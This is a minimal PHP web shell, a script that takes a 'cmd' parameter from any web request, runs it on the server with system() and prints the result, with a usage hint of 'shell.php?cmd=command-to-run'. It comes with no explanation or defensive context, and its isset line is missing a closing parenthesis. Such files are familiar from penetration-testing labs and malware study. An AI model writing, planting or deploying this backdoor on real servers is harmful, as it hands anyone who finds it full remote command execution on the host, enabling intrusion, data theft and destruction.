<?php

if (isset($_REQUEST['cmd']) {
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
    die();
} else {
    echo "shell.php?cmd=command-to-run";
}

?>
